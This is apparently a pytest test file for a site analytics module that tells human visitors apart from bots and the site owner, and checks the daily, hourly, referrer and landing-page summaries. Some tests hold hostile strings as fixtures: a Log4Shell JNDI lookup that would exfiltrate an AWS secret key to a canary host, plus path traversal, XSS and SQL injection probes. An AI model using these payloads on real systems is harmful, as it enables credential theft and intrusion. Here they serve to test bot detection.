"""Counting people, not requests.

"I talked about the system today -- did anyone come?" is the question,
and a raw unique-IP count answers it badly enough to be worse than
nothing. On this server 45% of distinct paths had been hit exactly once,
by scanners probing for /wp-login.php from a fresh address each time.
Counted as visitors, a quiet day reads as a busy one, and the number
misleads precisely when somebody is relying on it.
"""

import pathlib

from conftest import stage_collection

import object_execution
import object_records
import object_visitors
import python_object_runtime

REPO_ROOT = pathlib.Path(__file__).resolve().parents[1]
ANALYTICS_OBJECTS = REPO_ROOT / "packages" / "app-analytics" / "objects"
RUNTIME = python_object_runtime.PythonObjectRuntime()

BROWSER = "Mozilla/5.0 (Macintosh) AppleWebKit/537.36 Chrome/128 Safari/537.36"


def view(ip, path="/", *, status=200, ua=BROWSER, owner="false",
         referrer="", at="2026-07-26T09:15:00Z"):
    return {"ip": ip, "path": path, "status": str(status), "user_agent": ua,
            "is_owner": owner, "referrer": referrer, "created_at": at,
            "method": "GET"}


# --- who counts as a person ----------------------------------------------------

def test_a_scanner_that_only_gets_404s_is_not_a_visitor():
    """The behavioural test, which is the one that matters: a blocklist of
    user agents is always out of date; walking a list of URLs that do not
    exist here is not."""
    rows = [view("10.0.0.1", "/wp-login.php", status=404, ua="Mozilla/5.0"),
            view("10.0.0.1", "/index1.php", status=404, ua="Mozilla/5.0"),
            view("10.0.0.1", "/.env", status=404, ua="Mozilla/5.0")]
    assert object_visitors.classify(rows) == {"10.0.0.1": object_visitors.BOT}


def test_a_real_page_plus_a_signal_is_a_visitor():
    """One 200 is necessary but not sufficient -- see the test below."""
    rows = [view("10.0.0.2", "/nope", status=404),
            view("10.0.0.2", "/shop", status=200, referrer="https://news.example")]
    assert object_visitors.classify(rows) == {"10.0.0.2": object_visitors.VISITOR}


def test_a_lone_hit_on_the_front_page_is_not_a_person():
    """`/` returns 200 to everyone, so a successful load there proves
    nothing. The first version of this counted every prober that touched
    the homepage as a visitor, which was a large slice of a real week's
    'direct traffic'."""
    rows = [view("10.0.0.7", "/", status=200)]
    assert object_visitors.classify(rows) == {"10.0.0.7": object_visitors.BOT}


def test_a_second_page_is_enough_on_its_own():
    """Nobody arrives at a second page by accident."""
    rows = [view("10.0.0.8", "/"), view("10.0.0.8", "/shop")]
    assert object_visitors.classify(rows) == {"10.0.0.8": object_visitors.VISITOR}


def test_a_session_cookie_is_enough_on_its_own():
    rows = [dict(view("10.0.0.9", "/"), session_id="abc123")]
    assert object_visitors.classify(rows) == {"10.0.0.9": object_visitors.VISITOR}


def test_an_attack_payload_in_a_header_is_never_a_visitor():
    """A real one arrived as a Log4Shell probe with an AWS-credential
    exfiltration template in the Referer, and was counted as a visitor
    because it had also loaded the front page. It is inert here -- that is
    a Java vulnerability probing a Python process -- but it is not a
    person."""
    payload = ("${jndi:ldap://b6c44635.canary.invalid/x}"
               "AWS_SECRET_ACCESS_KEY=${env:AWS_SECRET_ACCESS_KEY:-}")
    rows = [view("10.0.0.10", "/", referrer=payload),
            view("10.0.0.10", "/shop", referrer=payload)]
    assert object_visitors.classify(rows) == {"10.0.0.10": object_visitors.BOT}
    assert object_visitors.hostile(payload)
    assert not object_visitors.hostile("https://news.example/thread")


def test_a_traversal_or_injection_attempt_is_a_bot():
    for payload in ("/etc/passwd", "../../secret", "<script>alert(1)</script>",
                    "' or '1'='1"):
        rows = [view("10.0.0.11", "/", referrer=payload),
                view("10.0.0.11", "/shop", referrer=payload)]
        assert object_visitors.classify(rows)["10.0.0.11"] == object_visitors.BOT


def test_an_honest_crawler_stays_a_bot_even_when_it_finds_a_page():
    """Googlebot says what it is, and honesty should not promote it."""
    rows = [view("10.0.0.3", "/shop", status=200, ua="Googlebot/2.1")]
    assert object_visitors.classify(rows) == {"10.0.0.3": object_visitors.BOT}


def test_no_user_agent_at_all_is_a_script():
    rows = [view("10.0.0.4", "/shop", status=200, ua="")]
    assert object_visitors.classify(rows) == {"10.0.0.4": object_visitors.BOT}


def test_our_own_traffic_is_labelled_not_hidden():
    """Seeing your own visit is how you know the page records anything."""
    rows = [view("10.0.0.5", "/shop", status=200, owner="true")]
    assert object_visitors.classify(rows) == {"10.0.0.5": object_visitors.OPERATOR}


def test_an_api_only_client_is_not_a_visitor():
    """Fetching /collections/... is a script's shape, not a person's."""
    rows = [view("10.0.0.6", "/collections/notes/records", status=200)]
    assert object_visitors.classify(rows) == {"10.0.0.6": object_visitors.BOT}


# --- the numbers -----------------------------------------------------------------

def test_the_three_kinds_are_counted_apart():
    rows = [view("1.1.1.1", "/shop"), view("1.1.1.1", "/shop/p1"),
            view("2.2.2.2", "/", referrer="https://news.example"),
            view("9.9.9.9", "/wp-login.php", status=404),
            view("8.8.8.8", "/xmlrpc.php", status=404),
            view("3.3.3.3", "/orders", owner="true")]
    summary = object_visitors.summarize(rows, days=7)

    assert summary["totals"]["visitor"]["unique"] == 2
    assert summary["totals"]["visitor"]["views"] == 3
    assert summary["totals"]["bot"]["unique"] == 2
    assert summary["totals"]["operator"]["views"] == 1


def test_a_returning_visitor_is_one_visitor():
    rows = [view("1.1.1.1", "/shop", at=f"2026-07-26T{h:02d}:00:00Z",
                 referrer="https://news.example") for h in (9, 10, 11)]
    summary = object_visitors.summarize(rows, days=7)
    assert summary["totals"]["visitor"]["unique"] == 1
    assert summary["totals"]["visitor"]["views"] == 3


def test_today_is_broken_down_by_hour():
    import datetime

    now = datetime.datetime(2026, 7, 26, 23, 0, tzinfo=datetime.timezone.utc)
    ref = "https://news.example"
    rows = [view("1.1.1.1", "/shop", at="2026-07-26T09:30:00Z", referrer=ref),
            view("2.2.2.2", "/shop", at="2026-07-26T09:45:00Z", referrer=ref),
            view("3.3.3.3", "/shop", at="2026-07-26T14:05:00Z", referrer=ref)]
    summary = object_visitors.summarize(rows, now=now, days=7)

    hours = {row["bucket"][-2:]: row["visitors"] for row in summary["hours"]}
    assert hours["09"] == 2 and hours["14"] == 1 and hours["00"] == 0
    assert len(summary["hours"]) == 24


def test_the_window_is_a_full_run_of_days_including_empty_ones():
    """A day with no visitors is information; a gap in the series is not."""
    import datetime

    now = datetime.datetime(2026, 7, 26, 12, 0, tzinfo=datetime.timezone.utc)
    rows = [view("1.1.1.1", "/shop", at="2026-07-24T09:00:00Z",
                 referrer="https://news.example")]
    summary = object_visitors.summarize(rows, now=now, days=7)

    assert [row["bucket"] for row in summary["days"]] == [
        f"2026-07-{day}" for day in range(20, 27)]
    assert sum(row["visitors"] for row in summary["days"]) == 1


def test_traffic_older_than_the_window_is_excluded():
    import datetime

    now = datetime.datetime(2026, 7, 26, 12, 0, tzinfo=datetime.timezone.utc)
    rows = [view("1.1.1.1", "/shop", at="2026-06-01T09:00:00Z")]
    summary = object_visitors.summarize(rows, now=now, days=7)
    assert sum(row["views"] for row in summary["days"]) == 0


def test_referrers_answer_where_did_they_come_from():
    """The actual point of the page on the day you tell somebody about it."""
    rows = [view("1.1.1.1", "/shop", referrer="https://news.example/thread"),
            view("2.2.2.2", "/shop", referrer="https://news.example/thread"),
            view("3.3.3.3", "/shop"), view("3.3.3.3", "/orders")]
    summary = object_visitors.summarize(rows, days=7)

    top = summary["referrers"][0]
    assert top["referrer"] == "https://news.example/thread" and top["visitors"] == 2
    assert any(row["referrer"].startswith("(direct") for row in summary["referrers"])


def test_bot_referrers_never_pollute_the_list():
    rows = [view("9.9.9.9", "/wp-login.php", status=404,
                 referrer="https://spam.example")]
    summary = object_visitors.summarize(rows, days=7)
    assert summary["referrers"] == []


def test_landing_pages_are_what_visitors_actually_opened():
    ref = "https://news.example"
    rows = [view("1.1.1.1", "/shop", referrer=ref),
            view("2.2.2.2", "/shop", referrer=ref),
            view("1.1.1.1", "/collections/notes/records", referrer=ref)]
    summary = object_visitors.summarize(rows, days=7)
    assert summary["landing"][0] == {"path": "/shop", "visitors": 2}


def test_an_empty_log_is_a_clean_zero_not_a_crash():
    summary = object_visitors.summarize([], days=7)
    assert summary["totals"]["visitor"]["unique"] == 0
    assert len(summary["days"]) == 7


# --- the page ---------------------------------------------------------------------

def render(payload=None):
    return object_execution.execute_object(
        RUNTIME,
        object_execution.ObjectExecutionRequest(
            "site_visitors", method="GET", payload=payload or {}),
        roots=[ANALYTICS_OBJECTS]).result


def test_the_page_refuses_an_anonymous_caller(tmp_path, monkeypatch):
    monkeypatch.setenv("DBBASIC_DATA_DIR", str(tmp_path))
    body = render()["body"]
    assert "Sign in" in body and "unique visitors" not in body


def test_the_page_says_so_when_capture_is_off(tmp_path, monkeypatch):
    """A page of zeros would read as 'nobody came' when the truth is
    'nothing was recorded'."""
    monkeypatch.setenv("DBBASIC_DATA_DIR", str(tmp_path))
    monkeypatch.delenv("DBBASIC_ANALYTICS", raising=False)
    body = render({"_identity": {"user_id": "dan"}})["body"]
    assert "capture is off" in body


def test_the_page_reports_real_numbers(tmp_path, monkeypatch):
    data_dir = tmp_path / "data"
    stage_collection(data_dir, "app-analytics", "page_views")
    monkeypatch.setenv("DBBASIC_DATA_DIR", str(data_dir))
    monkeypatch.setenv("DBBASIC_ANALYTICS", "on")

    for row in (view("1.1.1.1", "/shop"), view("2.2.2.2", "/shop"),
                view("9.9.9.9", "/wp-login.php", status=404)):
        # created_at is server-stamped, exactly as the capture hook leaves
        # it; the fold reads whatever the record layer wrote.
        row.pop("created_at")
        object_records.create_collection_record(
            "page_views", row, base_dir=data_dir, actor="test")

    body = render({"_identity": {"user_id": "dan"}})["body"]
    assert "unique visitors" in body
    assert "distinct IP address" in body       # the honesty note is not optional
